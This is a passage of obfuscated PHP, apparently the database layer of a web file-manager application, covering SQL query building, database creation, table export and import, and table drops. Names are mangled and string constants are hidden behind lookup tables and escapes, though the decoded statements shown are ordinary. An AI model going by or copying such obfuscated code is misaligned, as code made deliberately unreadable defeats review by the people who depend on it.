$«í°ÚÊø[$—÷Ê‘»À[338]] : $—÷Ê‘»À[12]) . $this->parseLock(isset($«í°ÚÊø[$—÷Ê‘»À[873]]) ? $«í°ÚÊø[$—÷Ê‘»À[873]] : !1) . $this->parseComment(!empty($«í°ÚÊø[$—÷Ê‘»À[400]]) ? $«í°ÚÊø[$—÷Ê‘»À[400]] : $—÷Ê‘»À[12]); return $this->execute($ïƒ²òÉ¬, $this->parseBind(!empty($«í°ÚÊø[$—÷Ê‘»À[331]]) ? $«í°ÚÊø[$—÷Ê‘»À[331]] : array())); } public function delete($‚ß‰Ö×‘ = array()) { $õ½Ïëš¶ =& $_SERVER[ ÇƒŠìÀ]; $this->model = $‚ß‰Ö×‘[$õ½Ïëš¶[327]]; $äÛ•ªÅğ = $õ½Ïëš¶[1077] . $this->parseTable($‚ß‰Ö×‘[$õ½Ïëš¶[325]]) . $this->parseWhere(!empty($‚ß‰Ö×‘[$õ½Ïëš¶[321]]) ? $‚ß‰Ö×‘[$õ½Ïëš¶[321]] : $õ½Ïëš¶[12]) . $this->parseOrder(!empty($‚ß‰Ö×‘[$õ½Ïëš¶[411]]) ? $‚ß‰Ö×‘[$õ½Ïëš¶[411]] : $õ½Ïëš¶[12]) . $this->parseLimit(!empty($‚ß‰Ö×‘[$õ½Ïëš¶[338]]) ? $‚ß‰Ö×‘[$õ½Ïëš¶[338]] : $õ½Ïëš¶[12]) . $this->parseLock(isset($‚ß‰Ö×‘[$õ½Ïëš¶[873]]) ? $‚ß‰Ö×‘[$õ½Ïëš¶[873]] : !1) . $this->parseComment(!empty($‚ß‰Ö×‘[$õ½Ïëš¶[400]]) ? $‚ß‰Ö×‘[$õ½Ïëš¶[400]] : $õ½Ïëš¶[12]); return $this->execute($äÛ•ªÅğ, $this->parseBind(!empty($‚ß‰Ö×‘[$õ½Ïëš¶[331]]) ? $‚ß‰Ö×‘[$õ½Ïëš¶[331]] : array())); } public function select($ÕçÈºÜ¡ = array()) { $¬¶í«¬ç =& $_SERVER[ ÇƒŠìÀ]; $this->model = $ÕçÈºÜ¡[$¬¶í«¬ç[327]]; $³‹º‘¤ = $this->buildSelectSql($ÕçÈºÜ¡); $¶Èİ„Ñ = isset($ÕçÈºÜ¡[$¬¶í«¬ç[395]]) ? $ÕçÈºÜ¡[$¬¶í«¬ç[395]] : !1; if ($¶Èİ„Ñ) { $åñ¨§©€ = is_string($¶Èİ„Ñ[$¬¶í«¬ç[96]]) ? $¶Èİ„Ñ[$¬¶í«¬ç[96]] : $¬¶í«¬ç[1078] . md5($³‹º‘¤); $õ“•şÖ­ = think_cache($åñ¨§©€, $¬¶í«¬ç[12], $¶Èİ„Ñ); if (!1 !== $õ“•şÖ­) { return $õ“•şÖ­; } } $ËœÀ‰Ğ¡ = $this->query($³‹º‘¤, $this->parseBind(!empty($ÕçÈºÜ¡[$¬¶í«¬ç[331]]) ? $ÕçÈºÜ¡[$¬¶í«¬ç[331]] : array())); if ($¶Èİ„Ñ && !1 !== $ËœÀ‰Ğ¡) { think_cache($åñ¨§©€, $ËœÀ‰Ğ¡, $¶Èİ„Ñ); } return $ËœÀ‰Ğ¡; } public function buildSelectSql($¤Ï¬¢óÈ = array()) { $µíºÖ’è =& $_SERVER[ ÇƒŠìÀ]; if (isset($¤Ï¬¢óÈ[$µíºÖ’è[399]])) { if (strpos($¤Ï¬¢óÈ[$µíºÖ’è[399]], $µíºÖ’è[50])) { list($Ìº‡ÜßÊ, $¡–ˆÍÅ‹) = explode($µíºÖ’è[50], $¤Ï¬¢óÈ[$µíºÖ’è[399]]); } else { $Ìº‡ÜßÊ = $¤Ï¬¢óÈ[$µíºÖ’è[399]]; } $Ìº‡ÜßÊ = $Ìº‡ÜßÊ ? $Ìº‡ÜßÊ : 1; $¡–ˆÍÅ‹ = isset($¡–ˆÍÅ‹) ? $¡–ˆÍÅ‹ : (is_numeric($¤Ï¬¢óÈ[$µíºÖ’è[338]]) ? $¤Ï¬¢óÈ[$µíºÖ’è[338]] : 20); $ê½ƒ´‚Ñ = $¡–ˆÍÅ‹ * ((int) $Ìº‡ÜßÊ - 1); $¤Ï¬¢óÈ[$µíºÖ’è[338]] = $ê½ƒ´‚Ñ . $µíºÖ’è[50] . $¡–ˆÍÅ‹; } if (think_config($µíºÖ’è[1079])) { $ôçÍÑ ‡ = $µíºÖ’è[1080] . md5(serialize($¤Ï¬¢óÈ)); $ù°à¾È = think_cache($ôçÍÑ ‡); if ($ù°à¾È) { return $ù°à¾È; } } $½§­ã› = $this->parseSql($this->selectSql, $¤Ï¬¢óÈ); $½§­ã› .= $this->parseLock(isset($¤Ï¬¢óÈ[$µíºÖ’è[873]]) ? $¤Ï¬¢óÈ[$µíºÖ’è[873]] : !1); if (isset($ôçÍÑ ‡)) { think_cache($ôçÍÑ ‡, $½§­ã›); } return $½§­ã›; } public function parseSql($ßŒ¼ÁÌÜ, $ßÉı¨Û = array()) { $ÁˆñÔğá =& $_SERVER[ ÇƒŠìÀ]; $ßŒ¼ÁÌÜ = str_replace(array($ÁˆñÔğá[1081], $ÁˆñÔğá[1082], $ÁˆñÔğá[1083], $ÁˆñÔğá[1084], $ÁˆñÔğá[1085], $ÁˆñÔğá[1086], $ÁˆñÔğá[1087], $ÁˆñÔğá[1088], $ÁˆñÔğá[1089], $ÁˆñÔğá[1090], $ÁˆñÔğá[1091]), array($this->parseTable("{$ßÉı¨Û[$ÁˆñÔğá[325]]}"), $this->parseDistinct(isset($ßÉı¨Û[$ÁˆñÔğá[1092]]) ? $ßÉı¨Û[$ÁˆñÔğá[1092]] : !1), $this->parseField(!empty($ßÉı¨Û[$ÁˆñÔğá[319]]) ? $ßÉı¨Û[$ÁˆñÔğá[319]] : $ÁˆñÔğá[205]), $this->parseJoin(!empty($ßÉı¨Û[$ÁˆñÔğá[328]]) ? $ßÉı¨Û[$ÁˆñÔğá[328]] : $ÁˆñÔğá[12]), $this->parseWhere(!empty($ßÉı¨Û[$ÁˆñÔğá[321]]) ? $ßÉı¨Û[$ÁˆñÔğá[321]] : $ÁˆñÔğá[12]), $this->parseGroup(!empty($ßÉı¨Û[$ÁˆñÔğá[549]]) ? $ßÉı¨Û[$ÁˆñÔğá[549]] : $ÁˆñÔğá[12]), $this->parseHaving(!empty($ßÉı¨Û[$ÁˆñÔğá[1093]]) ? $ßÉı¨Û[$ÁˆñÔğá[1093]] : $ÁˆñÔğá[12]), $this->parseOrder(!empty($ßÉı¨Û[$ÁˆñÔğá[411]]) ? $ßÉı¨Û[$ÁˆñÔğá[411]] : $ÁˆñÔğá[12]), $this->parseLimit(!empty($ßÉı¨Û[$ÁˆñÔğá[338]]) ? $ßÉı¨Û[$ÁˆñÔğá[338]] : $ÁˆñÔğá[12]), $this->parseUnion(!empty($ßÉı¨Û[$ÁˆñÔğá[393]]) ? $ßÉı¨Û[$ÁˆñÔğá[393]] : $ÁˆñÔğá[12]), $this->parseComment(!empty($ßÉı¨Û[$ÁˆñÔğá[400]]) ? $ßÉı¨Û[$ÁˆñÔğá[400]] : $ÁˆñÔğá[12])), $ßŒ¼ÁÌÜ); return $ßŒ¼ÁÌÜ; } public function getLastSql($¹şÕç’™ = '') { return $¹şÕç’™ ? $this->modelSql[$¹şÕç’™] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($±ÒùÛ) { return addslashes($±ÒùÛ); } public function setModel($ú‚•¶Ÿä) { $this->model = $ú‚•¶Ÿä; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ï»º§úğ = array()) { $²ÈÕ©Ù¦ =& $_SERVER[ ÇƒŠìÀ]; if (empty($ï»º§úğ)) { $ï»º§úğ = $GLOBALS[$²ÈÕ©Ù¦[6]][$²ÈÕ©Ù¦[21]]; } $this->database = $ï»º§úğ; } public function model($•ş”éä« = '') { return new ModelBase($•ş”éä«, $_SERVER[ ÇƒŠìÀ][12], $this->database); } public function db($àşˆåÁ = false) { $ä¶ù…àò =& $_SERVER[ ÇƒŠìÀ]; $‰¤²ôî† = array_change_key_case($this->database); if ($this->dbType() == $ä¶ù…àò[13] || !$àşˆåÁ) { return $this->model()->db(); } $šÂÜìÎŠ = $‰¤²ôî†[$ä¶ù…àò[1007]]; $‰¤²ôî†[$ä¶ù…àò[1007]] = $ä¶ù…àò[12]; if ($‰¤²ôî†[$ä¶ù…àò[1002]] == $ä¶ù…àò[999]) { $ÔòÅÙÙº = $‰¤²ôî†[$ä¶ù…àò[1008]]; $‰¤²ôî†[$ä¶ù…àò[1008]] = substr($ÔòÅÙÙº, 0, strrpos($ÔòÅÙÙº, $ä¶ù…àò[1094])); } $this->database = $‰¤²ôî†; $¸ø·˜¬ = $this->model()->db(); try { $î¦öŠÉ¤ = $¸ø·˜¬->execute("\x73\x68\x6f\x77\40\x64\141\164\141\x62\141\x73\145\x73\40\x6c\151\153\145\40\47{$šÂÜìÎŠ}\47"); } catch (Exception $¨ ¹›¶î) { } if (!$î¦öŠÉ¤) { $¸ø·˜¬->execute("\143\x72\145\x61\164\x65\x20\x64\x61\164\x61\x62\x61\163\145\x20\x60{$šÂÜìÎŠ}\x60"); } $‰¤²ôî†[$ä¶ù…àò[1007]] = $šÂÜìÎŠ; if ($‰¤²ôî†[$ä¶ù…àò[1002]] == $ä¶ù…àò[999]) { $‰¤²ôî†[$ä¶ù…àò[1008]] .= $ä¶ù…àò[1094] . $šÂÜìÎŠ; } $this->database = $‰¤²ôî†; $¸ø·˜¬->execute("\165\x73\x65\x20\140{$šÂÜìÎŠ}\x60"); return $¸ø·˜¬; } public function createTable($ñ›î›, &$ø×Âı¯) { $Ş„ıÌÖ =& $_SERVER[ ÇƒŠìÀ]; if (!IO::exist($ñ›î›)) { ActionCall($Ş„ıÌÖ[1095], !0, 0); show_json(LNG($Ş„ıÌÖ[1096]), !1); } $±ÙÜ“Á = $this->model()->db(); $ñŞ‹¨ã™ = sqlSplit(IO::getContent($ñ›î›)); foreach ($ñŞ‹¨ã™ as $¯É«”ÖÁ) { $³õ€–… = stripos($¯É«”ÖÁ, $Ş„ıÌÖ[1097]) === 0; if ($³õ€–…) { $ø×Âı¯->task[$Ş„ıÌÖ[815]] += 1; } $±ÙÜ“Á->execute($¯É«”ÖÁ); if ($³õ€–…) { preg_match($Ş„ıÌÖ[1098], $¯É«”ÖÁ, $¶ÄÂªò»); $ø×Âı¯->task[$Ş„ıÌÖ[1099]] = $¶ÄÂªò»[1]; $ø×Âı¯->update(1); } } } public function insertTable($¿êî‰ñÂ, &$øÒïÓ°Ä) { $‚İúŸÃˆ =& $_SERVER[ ÇƒŠìÀ]; $ŠŠèßèå = $this->model()->db(); $û™à±ê– = $äøµ¬Ù ? array($äøµ¬Ù) : $ŠŠèßèå->getTables(); foreach ($¿êî‰ñÂ as $—ñÏÈş) { $äøµ¬Ù = basename($—ñÏÈş, $‚İúŸÃˆ[817]); if (!in_array($äøµ¬Ù, $û™à±ê–)) { continue; } $øÒïÓ°Ä->task[$‚İúŸÃˆ[1099]] = $äøµ¬Ù; if (get_filesize($—ñÏÈş) == 0) { continue; } $ø¤˜Ê˜Ü = $this->sqlToDb($—ñÏÈş, $øÒïÓ°Ä); if (!$ø¤˜Ê˜Ü) { ActionCall($‚İúŸÃˆ[1095], !0, 0); show_json(LNG($‚İúŸÃˆ[1100]) . "\133{$äøµ¬Ù}\x5d", !1); } } } public function sqlFromDb($˜øŸşò™, $¡üÛ°¶¥, &$­ê¦œ½ü, $ŠêŒİ = '') { if ($­ê¦œ½ü) { $­ê¦œ½ü->task[$_SERVER[ ÇƒŠìÀ][1099]] = $˜øŸşò™; } $‚¹È ˜ò = $this->model($˜øŸşò™); $úœ‹—ÌÂ = 0; $À“ĞË° = 0; $³œËÀÛÀ = 10000; $õİš§ŠÈ = fopen($¡üÛ°¶¥, $_SERVER[ ÇƒŠìÀ][1101]); $¤ó“Üç½ = $‚¹È ˜ò->getPk(); $¡üÎ–¦§ = $‚¹È ˜ò->getDbFields(); $Èæ…÷ = $_SERVER[ ÇƒŠìÀ][12]; if ($GLOBALS[$_SERVER[ ÇƒŠìÀ][816]] && in_array($˜øŸşò™, array($_SERVER[ ÇƒŠìÀ][1102], $_SERVER[ ÇƒŠìÀ][1103]))) { $Èæ…÷ = $˜øŸşò™; } do { $âøÑ‘ğÈ = array($¤ó“Üç½ => array($_SERVER[ ÇƒŠìÀ][1049], $À“ĞË°)); $ìèº£ä‚ = $‚¹È ˜ò->where($âøÑ‘ğÈ)->field($¡üÎ–¦§)->order($¤ó“Üç½ . $_SERVER[ ÇƒŠìÀ][1104])->limit($³œËÀÛÀ)->select(); $ìèº£ä‚ = !empty($ìèº£ä‚) ? $ìèº£ä‚ : array(); if (!($­Ü£œäß = count($ìèº£ä‚))) { break; } $ãÅ¼Ö“™ = end($ìèº£ä‚); $À“ĞË° = $ãÅ¼Ö“™[$¤ó“Üç½]; $¹»Ğûíï = array(); foreach ($ìèº£ä‚ as $çŸùø·¬) { if ($Èæ…÷) { if ($˜øŸşò™ == $_SERVER[ ÇƒŠìÀ][1102]) { if ($çŸùø·¬[$_SERVER[ ÇƒŠìÀ][33]] == $_SERVER[ ÇƒŠìÀ][1105]) { $¬Ö¤ÕåÕ = json_decode($çŸùø·¬[$_SERVER[ ÇƒŠìÀ][420]], !0); if ($¬Ö¤ÕåÕ[$_SERVER[ ÇƒŠìÀ][32]] == $GLOBALS[$_SERVER[ ÇƒŠìÀ][816]] && $¬Ö¤ÕåÕ[$_SERVER[ ÇƒŠìÀ][779]] != 1) { continue; } } } else { if ($çŸùø·¬[$_SERVER[ ÇƒŠìÀ][33]] == $_SERVER[ ÇƒŠìÀ][1106] && $çŸùø·¬[$_SERVER[ ÇƒŠìÀ][96]] == $_SERVER[ ÇƒŠìÀ][808]) { continue; } } } if ($ŠêŒİ) { $çŸùø·¬[$_SERVER[ ÇƒŠìÀ][86]] = "\173\151\157\x3a{$ŠêŒİ}\x7d" . substr($çŸùø·¬[$_SERVER[ ÇƒŠìÀ][86]], strlen("\x7b\x69\157\72{$çŸùø·¬[$_SERVER[ ÇƒŠìÀ][846]]}\x7d")); $çŸùø·¬[$_SERVER[ ÇƒŠìÀ][846]] = $ŠêŒİ; } $¹»Ğûíï[] = $_SERVER[ ÇƒŠìÀ][1107] . $this->sqlEncode($çŸùø·¬) . $_SERVER[ ÇƒŠìÀ][1108]; } $ÙàÚ«˜• = "\111\x4e\x53\x45\122\124\x20\111\116\x54\x4f\x20\140{$˜øŸşò™}\x60\40\50\140" . implode($_SERVER[ ÇƒŠìÀ][1109], $¡üÎ–¦§) . $_SERVER[ ÇƒŠìÀ][1110]; fwrite($õİš§ŠÈ, $ÙàÚ«˜• . implode($_SERVER[ ÇƒŠìÀ][1111], $¹»Ğûíï) . $_SERVER[ ÇƒŠìÀ][73] . PHP_EOL); $úœ‹—ÌÂ += $­Ü£œäß; if ($­ê¦œ½ü) { $­ê¦œ½ü->update($­Ü£œäß); } } while ($³œËÀÛÀ == $­Ü£œäß); fclose($õİš§ŠÈ); return $úœ‹—ÌÂ; } public function sqlToDb($“ºÑ¾ËØ, &$·ÄÛÜù³) { $ø¯™õˆ™ =& $_SERVER[ ÇƒŠìÀ]; $ùáƒ†¥» = $this->model()->db(); $×ÑòŞÀ = @fopen($“ºÑ¾ËØ, $ø¯™õˆ™[1112]); if (!$×ÑòŞÀ) { return !1; } $‡”óÇìª = 0; $¸ùüôä = $ø¯™õˆ™[12]; $Ôë£ÊÈ… = array(); $¾ò›¾›¡ = $this->dbType(); $Ş¶úË¼Ò = $¾ò›¾›¡ == $ø¯™õˆ™[13] ? 500 : 2000; $îÍşş£Ğ = basename($“ºÑ¾ËØ, $ø¯™õˆ™[817]); $£„şâ = 0; $ñø¼ú²Œ = 4194304 - 104858; $ñíÏ¯ô‚ = 1000000 - 104858; while (!feof($×ÑòŞÀ)) { $µÔÁš  = trim(fgets($×ÑòŞÀ)); if (!$µÔÁš ) { continue; } $Ş¬—¤— = $this->sqlDecode($µÔÁš , $¾ò›¾›¡, $îÍşş£Ğ); if (stripos($Ş¬—¤—, $ø¯™õˆ™[401]) === 0) { if (!$¸ùüôä) { $¸ùüôä = $Ş¬—¤— . $ø¯™õˆ™[53]; } continue; } if ($·ÄÛÜù³) { $·ÄÛÜù³->task[$ø¯™õˆ™[815]] += 1; } $‡”óÇìª++; $Ôë£ÊÈ…[] = rtrim(rtrim(trim($Ş¬—¤—), $ø¯™õˆ™[50]), $ø¯™õˆ™[73]); $˜ï¥Éˆ× = null; $ÎÛâØŠÙ = strlen($Ş¬—¤—); $£„şâ += $ÎÛâØŠÙ; if ($£„şâ >= ($Ş¶úË¼Ò == 500 ? $ñíÏ¯ô‚ : $ñø¼ú²Œ)) { $˜ï¥Éˆ× = array_pop($Ôë£ÊÈ…); if ($‡”óÇìª > 1) { $‡”óÇìª--; } } if ($‡”óÇìª >= $Ş¶úË¼Ò || $˜ï¥Éˆ×) { $Ş¬—¤— = $¸ùüôä . implode($ø¯™õˆ™[50], $Ôë£ÊÈ…); if (!$ùáƒ†¥»->execute($Ş¬—¤—)) { return !1; } if ($·ÄÛÜù³) { $·ÄÛÜù³->update($‡”óÇìª); } $Ôë£ÊÈ… = array(); $‡”óÇìª = 0; $£„şâ = 0; if ($˜ï¥Éˆ×) { $Ôë£ÊÈ… = array($˜ï¥Éˆ×); $‡”óÇìª = 1; $£„şâ = $ÎÛâØŠÙ; } } } fclose($×ÑòŞÀ); if (!empty($Ôë£ÊÈ…)) { $Ş¬—¤— = $¸ùüôä . implode($ø¯™õˆ™[50], $Ôë£ÊÈ…); if (!$ùáƒ†¥»->execute($Ş¬—¤—)) { return !1; } if ($·ÄÛÜù³) { $·ÄÛÜù³->update($‡”óÇìª); } } return !0; } public function dropTable($÷ä›ª° = null) { $İùáˆºÅ = $this->model()->db(); $Ä©ğõÑÆ = $÷ä›ª° ? array($÷ä›ª°) : $İùáˆºÅ->getTables(); if (!$Ä©ğõÑÆ) { return; } foreach ($Ä©ğõÑÆ as $÷ä›ª°) { if ($÷ä›ª°) { $÷ä›ª° = strtolower($÷ä›ª°); } else { continue; } $İùáˆºÅ->execute("\144\162\157\160\x20\x74\141\142\x6c\x65\40\x69\146\40\x65\x78\151\163\x74\x73\40\x60{$÷ä›ª°}\140"); } } private function sqlEncode($ñ¦ù†ë¨) { $Ÿ’èª”Ñ =& $_SERVER[ ÇƒŠìÀ]; $«ºº¾ = array(); foreach ($ñ¦ù†ë¨ as $Ÿ¿´±öä) { if (is_array($Ÿ¿´±öä)) { $Ÿ¿´±öä = json_encode_force($Ÿ¿´±öä); } $Ÿ¿´±öä = addslashes($Ÿ¿´±öä); $Ÿ¿´±öä = str_replace(array($Ÿ’èª”Ñ[1113], $Ÿ’èª”Ñ[248]), array($Ÿ’èª”Ñ[1114], $Ÿ’èª”Ñ[1115]), $Ÿ¿´±öä); $«ºº¾[] = str_replace($Ÿ’èª”Ñ[58], $Ÿ’èª”Ñ[1116], $Ÿ¿´±öä); } return $Ÿ’èª”Ñ[58] . implode($Ÿ’èª”Ñ[1117], $«ºº¾) . $Ÿ’èª”Ñ[58]; } private function sqlDecode($ú¯¤­õ, $ıúìä, $¤¸ÂóÊÏ = '') { $Ğö¶ˆä =& $_SERVER[ ÇƒŠìÀ]; $ú¯¤­õ = str_replace(array($Ğö¶ˆä[1114], $Ğö¶ˆä[1115]), array($Ğö¶ˆä[1113], $Ğö¶ˆä[248]), $ú¯¤­õ); if ($ıúìä == $Ğö¶ˆä[13]) { return $¤¸ÂóÊÏ != $Ğö¶ˆä[1118] ? stripslashes($ú¯¤­õ) : $ú¯¤­õ; } if ($¤¸ÂóÊÏ == $Ğö¶ˆä[1118]) { $ú¯¤­õ = str_replace($Ğö¶ˆä[1119], $Ğö¶ˆä[120], stripslashes($ú¯¤­õ)); } return $ú¯¤­õ; } public function getSqlFile($Û¢¢‰·œ = '') { $”Ú€±â =& $_SERVER[ ÇƒŠìÀ]; $Ş»”×Ó³ = $this->dbType(!0); $ğ‹€ë„¯ = CONTROLLER_DIR . "\151\156\163\164\x61\x6c\154\x2f\144\x61\x74\x61\x2f{$Ş»”×Ó³}\56\163\161\x6c"; $¥•œ¥µ = file_get_contents($ğ‹€ë„¯); $ï¼ˆè²® = $”Ú€±â[1120] . ($Ş»”×Ó³ == $”Ú€±â[833] ? $”Ú€±â[1121] : $”Ú€±â[1122]) . $”Ú€±â[1123]; preg_match_all($ï¼ˆè²®, $¥•œ¥µ, $ºëùóİú); $Ïü•˜Õ£ = $ºëùóİú[1]; $Ëç™şäÙ = $this->model()->db(); $½§½±¦š = $Ëç™şäÙ->getTables(); $‡”ç˜ìî = TEMP_FILES . $”Ú€±â[1124] . date($”Ú€±â[257]) . $”Ú€±â[8]; del_dir($‡”ç˜ìî); mk_dir($‡”ç˜ìî); $¬ïñÑ§å = $‡”ç˜ìî . $”Ú€±â[1125]; $ú·ÛàÖ€ = $‡”ç˜ìî . $”Ú€±â[1126]; $˜ö•ç¶¿ = $Ş»”×Ó³ == $”Ú€±â[13] ? $”Ú€±â[833] : $”Ú€±â[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\x74\x61\x6c\154\x2f\144\x61\x74\141\x2f{$˜ö•ç¶¿}\x2e\163\161\x6c", $‡”ç˜ìî); @touch($‡”ç˜ìî . $Ş»”×Ó³ . $”Ú€±â[817]); $óËÂÇªÎ = fopen($¬ïñÑ§å, $”Ú€±â[1101]); $«ƒ¢áË = fopen($ú·ÛàÖ€, $”Ú€±â[1101]); if ($Ş»”×Ó³ == $”Ú€±â[13]) { $½§½±¦š = array_diff($½§½±¦š, array($”Ú€±â[813], $”Ú€±â[814])); $şõ¼Å´½ = array($”Ú€±â[1127], $”Ú€±â[1128], $”Ú€±â[1129]); fwrite($«ƒ¢áË, implode(PHP_EOL, $şõ¼Å´½) . PHP_EOL . PHP_EOL); foreach ($½§½±¦š as $ÖÜ‡·ßê) { $ú×ÖÅÒ = $this->sqlFromSqlite($ÖÜ‡·ßê); if (!$ú×ÖÅÒ[$”Ú€±â[13]]) { continue; } fwrite($«ƒ¢áË, $ú×ÖÅÒ[$”Ú€±â[13]] . PHP_EOL . PHP_EOL); if (!in_array($ÖÜ‡·ßê, $Ïü•˜Õ£)) { fwrite($óËÂÇªÎ, $ú×ÖÅÒ[$”Ú€±â[833]] . PHP_EOL . PHP_EOL); } } } else { foreach ($½§½±¦š as $ÖÜ‡·ßê) { $ú×ÖÅÒ = $this->sqlFromMysql($ÖÜ‡·ßê); if (!$ú×ÖÅÒ[$”Ú€±â[833]]) { continue; } fwrite($óËÂÇªÎ, $ú×ÖÅÒ[$”Ú€±â[833]] . PHP_EOL . PHP_EOL); if (!in_array($ÖÜ‡·ßê, $Ïü•˜Õ£)) { fwrite($«ƒ¢áË, $ú×ÖÅÒ[$”Ú€±â[13]] . PHP_EOL . PHP_EOL); } } } fclose($óËÂÇªÎ); fclose($«ƒ¢áË); $¥•œ¥µ = array($”Ú€±â[833] => $¬ïñÑ§å, $”Ú€±â[13] => $ú·ÛàÖ€); return $Û¢¢‰·œ ? $¥•œ¥µ[$Û¢¢‰·œ] : $¥•œ¥µ; } public function dbType($¯¶…Ü«º = false) { $øáŸ°Ì¯ =& $_SERVER[ ÇƒŠìÀ]; $éÀıÄë = $¯¶…Ü«º ? $GLOBALS[$øáŸ°Ì¯[6]][$øáŸ°Ì¯[21]] : $this->database; $éÀıÄë = array_change_key_case($éÀıÄë); $ß…šˆàø = $éÀıÄë[$øáŸ°Ì¯[1002]]; if ($ß…šˆàø == $øáŸ°Ì¯[999]) { $Éû¦ùˆ = explode($øáŸ°Ì¯[4], $éÀıÄë[$øáŸ°Ì¯[1008]]); $ß…šˆàø = $Éû¦ùˆ[0]; } $¾¦”™î¥ = array($øáŸ°Ì¯[1130] => $øáŸ°Ì¯[13], $øáŸ°Ì¯[945] => $øáŸ°Ì¯[833]); if (isset($¾¦”™î¥[$ß…šˆàø])) { $ß…šˆàø = $¾¦”™î¥[$ß…šˆàø]; } return $ß…šˆàø; } public function sqlFromMysql($’ìÕ‹†è, $œ¿ú¾ğõ = '') { $›ˆ©ÑŠß =& $_SERVER[ ÇƒŠìÀ]; $ĞóÀ‚ï = $this->model()->db(); $à… ³© = $ĞóÀ‚ï->query($›ˆ©ÑŠß[1131] . $’ìÕ‹†è . $›ˆ©ÑŠß[431]); if (!$à… ³© || !$à… ³©[0]) { return !1; } $İãåÌô“ = _get($à… ³©[0], $›ˆ©ÑŠß[1132], $›ˆ©ÑŠß[12]); if (!$İãåÌô“) { return !1; } $ÓÓÁ¼œ = "\104\122\x4f\x50\40\124\x41\x42\x4c\x45\x20\x49\x46\x20\105\x58\111\x53\x54\x53\x20\140{$’ìÕ‹†è}\140\x3b" . PHP_EOL . $İãåÌô“ . $›ˆ©ÑŠß[73]; if ($œ¿ú¾ğõ && $œ¿ú¾ğõ == $›ˆ©ÑŠß[833]) { return $ÓÓÁ¼œ; } $Çë‡÷½á = array_change_key_case($GLOBALS[$›ˆ©ÑŠß[6]][$›ˆ©ÑŠß[21]]); $òæÁ’‰í = $Çë‡÷½á[$›ˆ©ÑŠß[1007]]; $”²÷“ü = $›ˆ©ÑŠß[1133] . $òæÁ’‰í . $›ˆ©ÑŠß[1134] . $’ìÕ‹†è . $›ˆ©ÑŠß[58]; $²‘æ•í˜ = $›ˆ©ÑŠß[1135] . $’ìÕ‹†è . $›ˆ©ÑŠß[933]; $ßÊùİ¨è = $ĞóÀ‚ï->query($”²÷“ü); if (empty($ßÊùİ¨è)) { $°åü¹Ñ = array($›ˆ©ÑŠß[833] => $›ˆ©ÑŠß[12], $›ˆ©ÑŠß[13] => $›ˆ©ÑŠß[12]); return $œ¿ú¾ğõ ? $°åü¹Ñ[$œ¿ú¾ğõ] : $°åü¹Ñ; } $ŠÕª”£¤ = $ĞóÀ‚ï->query($²‘æ•í˜); $ü“àößõ = $›ˆ©ÑŠß[12]; $’ÎïÖ·¯ = array(); foreach ($ŠÕª”£¤ as $Ú §™Å®) { if (!$ü“àößõ && $Ú §™Å®[$›ˆ©ÑŠß[1136]] == $›ˆ©ÑŠß[1137]) { $ü“àößõ = $Ú §™Å®[$›ˆ©ÑŠß[1138]]; } if (isset($’ÎïÖ·¯[$Ú §™Å®[$›ˆ©ÑŠß[1136]]])) { $’ÎïÖ·¯[$Ú §™Å®[$›ˆ©ÑŠß[1136]]][$›ˆ©ÑŠß[1139]][] = $Ú §™Å®[$›ˆ©ÑŠß[1138]]; continue; } $’ÎïÖ·¯[$Ú §™Å®[$›ˆ©ÑŠß[1136]]] = array($›ˆ©ÑŠß[1140] => $Ú §™Å®[$›ˆ©ÑŠß[1136]], $›ˆ©ÑŠß[1139] => array($Ú §™Å®[$›ˆ©ÑŠß[1138]]), $›ˆ©ÑŠß[1141] => $Ú §™Å®[$›ˆ©ÑŠß[1142]] == $›ˆ©ÑŠß[90] ? 0 : 1); } $ÇæÊˆ = array(); foreach ($’ÎïÖ·¯ as $Ú §™Å®) { $«ª½ç¦’ = $Ú §™Å®[$›ˆ©ÑŠß[1140]] == $›ˆ©ÑŠß[1137]; $¶ñŸŸ¯Ø = array($›ˆ©ÑŠß[1143], $Ú §™Å®[$›ˆ©ÑŠß[1141]] == $›ˆ©ÑŠß[90] && !$«ª½ç¦’ ? $›ˆ©ÑŠß[1144] : $›ˆ©ÑŠß[12], $›ˆ©ÑŠß[1145], $›ˆ©ÑŠß[1146] . $’ìÕ‹†è . $›ˆ©ÑŠß[11] . ($«ª½ç¦’ ? $›ˆ©ÑŠß[1147] : $Ú §™Å®[$›ˆ©ÑŠß[1140]]) . $›ˆ©ÑŠß[120], $›ˆ©ÑŠß[1148], $›ˆ©ÑŠß[120] . $’ìÕ‹†è . $›ˆ©ÑŠß[120], $›ˆ©ÑŠß[1149] . implode($›ˆ©ÑŠß[1150], $Ú §™Å®[$›ˆ©ÑŠß[1139]]) . $›ˆ©ÑŠß[1151]); $ÇæÊˆ[] = implode($›ˆ©ÑŠß[53], $¶ñŸŸ¯Ø) . $›ˆ©ÑŠß[73]; } $ì¼ıêàÄ = array(); $ÙêÌ‚­Û = array($›ˆ©ÑŠß[1152] => $›ˆ©ÑŠß[1153], $›ˆ©ÑŠß[1153] => $›ˆ©ÑŠß[1153], $›ˆ©ÑŠß[334] => $›ˆ©ÑŠß[361], $›ˆ©ÑŠß[333] => $›ˆ©ÑŠß[361]); foreach ($ßÊùİ¨è as $Ú §™Å®) { $¶ñŸŸ¯Ø = array($›ˆ©ÑŠß[120] . $Ú §™Å®[$›ˆ©ÑŠß[1154]] . $›ˆ©ÑŠß[120], isset($ÙêÌ‚­Û[$Ú §™Å®[$›ˆ©ÑŠß[1155]]]) ? $ÙêÌ‚­Û[$Ú §™Å®[$›ˆ©ÑŠß[1155]]] : $Ú §™Å®[$›ˆ©ÑŠß[1156]], $Ú §™Å®[$›ˆ©ÑŠß[1157]] == $›ˆ©ÑŠß[931] ? $›ˆ©ÑŠß[1158] : $›ˆ©ÑŠß[1159], $Ú §™Å®[$›ˆ©ÑŠß[1154]] == $ü“àößõ ? $›ˆ©ÑŠß[1160] : $›ˆ©ÑŠß[12], $Ú §™Å®[$›ˆ©ÑŠß[984]] ? strtoupper(str_replace($›ˆ©ÑŠß[11], $›ˆ©ÑŠß[12], $Ú §™Å®[$›ˆ©ÑŠß[984]])) : $›ˆ©ÑŠß[12]); $ì¼ıêàÄ[] = trim(implode($›ˆ©ÑŠß[53], $¶ñŸŸ¯Ø)); } $›ûµí• = array($›ˆ©ÑŠß[1161] . $’ìÕ‹†è . 